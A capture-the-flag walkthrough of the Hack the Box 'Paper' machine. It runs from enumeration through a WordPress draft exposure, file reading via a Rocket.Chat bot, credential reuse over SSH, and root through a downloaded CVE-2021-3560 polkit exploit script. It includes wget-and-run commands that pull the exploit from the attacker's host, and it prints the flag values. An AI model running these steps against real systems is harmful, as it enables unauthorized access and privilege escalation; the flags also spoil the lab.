**Link:** [**Paper**](https://app.hackthebox.com/machines/432) CTF on Hack the Box.

**Hack the Box Difficulty Rating:** Easy

<br>

## Objectives
- user.txt flag
- root.txt flag

<br>

## Initial Enumeration

<br>

### Nmap Scan

Starting off with an nmap scan:

`sudo nmap -sC -sV -T4 10.129.108.172`

```

### Gobuster Scans

`gobuster dir -u http://10.129.108.172 -t 50 -r -x php,txt,html -w dir-med.txt`

```
/manual               (Status: 200) [Size: 9164]
```

`gobuster dir -u https://10.129.108.172 -k -t 50 -r -x php,txt,html -w dir-med.txt`

```
/manual               (Status: 200) [Size: 9164]
```

<br>

## Website Digging

Taking a look at the **http** version of the website:

![](images/paper1.png)

Not much there just a default page and the page source code doesn't reveal anything interesting either.

<br>

Taking a look at the **https** version produces the same results

<br>

I decide to run a **nikto** scan to see if it can find anything else:

`nikto -h http://10.10.108.172`

```
+ Uncommon header 'x-backend-server' found, with contents: office.paper
```

That looks interesting let's see if it's another site we can connect to.

I edit my **/etc/hosts** file and add **office.paper** to it:

```
10.129.108.172	office.paper
```

Then visit the page:

![](images/paper2.png)

The website turns out to be **WordPress v5.2.3** blog that Blunder Tiffin employees post to. I look around the website seeing if the search box is vulnerable to SQLi and it doesn't appear to be. The page source code doesn't give us anything. I run another **gobuster** scan on the **/manual** directory on both the http and https versions of the site and check out everything that shows up.

We have a standard **WordPress** login page but we don't have any credentials as of yet and I go back to the main page to explore.

![](images/paper2a.png)

Then I read some of the blog posts which provide potential user names to try later on. Opening up the **Feeling Alone!** post with there is a comment of interest:

```
 June 20, 2021 at 2:49 pm

Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick
```

I do a google search for wordpress 5.2.3 draft exploit and find the following:

![](images/paper3.png)

So I click on the **prisonmike** username to open up his author page and then append **?static=1** to the end of the URL:

```
http://office.paper/index.php/author/prisonmike/?static=1
```

We get page back with a new site to check out and it seems to be an employee chat system we can register a user on.

![](images/paper4.png)

<br>

## Rocket.Chat Digging

I add **chat.office.paper** to my **/etc/hosts** like earlier and then visit the URL:

```
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

![](images/paper5.png)

The only option we have is to register a new account which I try and it works, and then we can login to the chat system.

**Note** During the registration process a **register username** box pops up and you can enumerate existing usernames with it. I tried admin and it did not let me register it saying it's already in use. Unfortunately as soon as I tried one that didn't exist it moved on from this page.

![](images/paper6.png)

We have a standard opening screen with a hamburger menu and also a line of text saying if you're an admin go to the link at the end. I try that and do not have access.

Opening up the hamburger menu gives the ability to click on our user icon and select my account. I looked through there and did not find anything useful.

I then joined the **#general** chat and was presented with a slack type room.

![](images/paper7.png)

Notice it says at the bottom of the screenshot that the room is read only so we can't post any new messages to it. I scroll up and read through the chat and see that a chat bot named **recyclops** exists. A user named **kellylikescupcakes** issued it a help command and it responded saying you can ask it questions, and also show and view the contents of files through it.

![](images/paper8.png)

We're not allowed to post in the **#general** channel so I click on **recyclops** and send it a private message with the word help, and it responds to us just like he did in the channel.

I play around with the chat bot commands and eventually find that **list** will show the contents of the current directory and **file** will display the contents of a file.

![](images/paper9.png)

![](images/paper10.png)

I decide to try to use **LFI** to get some more useful information and it works.

![](images/paper11.png)

The **user.txt** flag is in the **dwight** home directory but we don't have access to display it.

I navigate around his home directory more and eventually stumble upon some user credentials in a file:

![](images/paper12.png)

<br>

## Logging into the system

Now that we have some credentials I try those out on the previous **WordPress** login page and that did not work. Nor can I login as **dwight** on the Rocket.Chat website. I also try the same password with the user **dwight** since he made the chat bot and that didn't work either.

The nmap scan earlier showed **ssh** open so I try the same information there, and am able to connect as user **dwight** using the password we found in the **.env** file:

```
──(kali㉿kali)-[~/Downloads]
└─$ ssh dwight@10.129.108.172
The authenticity of host '<10.129.108.172> (10.129.108.172)' can't be established.

This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:91: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.108.172' (ED25519) to the list of known hosts.
dwight@10.129.108.172's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ 
```

<br>

#### User flag

The first thing I go for is the **user.txt** flag in the **dwight** home directory that we saw earlier.

```
[dwight@paper ~]$ pwd
/home/dwight
[dwight@paper ~]$ ls
bot_restart.sh  hubot  sales  user.txt
[dwight@paper ~]$ cat user.txt
c483747230444b4f3a5ff1c79c01245a
```

<br>

## System enumeration

I've already looked through the files in his home directory via the chat bot interface so I look around the system to see what else I can find.

Unfortunately I don't have read permission **wp-config.php**. Looking around for **SUID** bit files doesn't give us anything.

I look at the file permissions of **pkexec** and it's had the **SUID** bit removed, so we can't use **pwnkit**. Makes sense since this is a brand new box that was just released.

```
[dwight@paper ~]$ ls -al /usr/bin/pkexec
-rwxr-xr-x. 1 root root 29816 May 11  2019 /usr/bin/pkexec
```

I start up an HTTP server on my system and transfer **linPEAS** over to do a quick scan of the system.

Several things come back such as the path variable for **dwight** being exploitable if we can find a proper **SUID** file to use, but that didn't happen.

This looks like the most promising lead to me after going through the results:

![](images/paper13.png)

<br>

## Privilege escalation

Digging around and reading up on the CVE I decide this looks like the most promising way to go about escalating our privilges. Notice the author name here, it's the same as the person who created the **Hack the Box** room.

```
https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh
```

I can't download the file directly to the machine so I download it on my own system with **wget** and then transfer it over like we did **linPEAS**.

On my system:

`wget https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh`

`python3 -m http.server 80`

On the target system:

`wget http://<MY IP>/poc.sh`

`chmod +x poc.sh`

Looking at the options back on the github page shows:

![](images/paper14.png)

I run the program with:

`./poc.sh -u=test -p=1111`

And get:

```
[x] Insertion of Username failed!
[!] Aborting Execution!
[!] Usually multiple attempts are required to get the timing right. Try running the exploit again.
[!] If the exploit doesn't work after several tries, then you may have to exploit this manually.
```

So it didn't work but it tells you this is a timing based attack and that you should run it multiple times until it does work. I run it a few more times and get a successful run not long after:

![](images/paper15.png)

I verify the user has been created by looking in **/etc/passwd**:

`tail -1 /etc/passwd`

```
test:x:1005:1005:test:/home/test:/bin/bash
```

The script tells you to use `sudo - test` but that will not work in this case because **dwight** does not have sudo privileges on this system.


Since the user does show as created I will try to **ssh** over and login with the newly created user.

**Note:** One thing I noticed here is that even though the script would say successful sometimes the password would not work when I attempded to login via ssh even though the user was created. Run it several more times trying to login after each attempt and eventually it will work.

`ssh test@10.129.108.172`

```
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Tue Feb  8 13:47:40 EST 2022 from 10.10.16.32 on ssh:notty
There were 5 failed login attempts since the last successful login.
[test@paper ~]$ 
```

Running `whoami`:

```
[test@paper ~]$ whoami
test
```

And verifying that we have **sudo** privileges by running `sudo -l`:

```
test@paper ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for test: 
Matching Defaults entries for test on paper:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User test may run the following commands on paper:
    (ALL) ALL
```

We're good to go, let's run a bash shell via sudo and we should be root:

`sudo bash`

Aaaaaaand there's a quirk. It looks like if you wait too long to run the command your user gets removed but you stay logged in:

```
[test@paper ~]$ sudo bash
sudo: you do not exist in the passwd database
```

I run the script again until I'm able to successfully login and quickly run the command it this time it works:

```
test@paper ~]$ sudo bash
[sudo] password for test: 
[root@paper test]#
```

<br>

#### Root flag

We're root! Let's go get that **root.txt** flag. I run:

`cd /root ; ls` and then display the flag we find:

```
[root@paper ~]# cd /root ; ls
anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
[root@paper ~]# cat root.txt
6fc7cfe6296388073790d85c25641406
```

<br>

And with that we've completed this CTF!
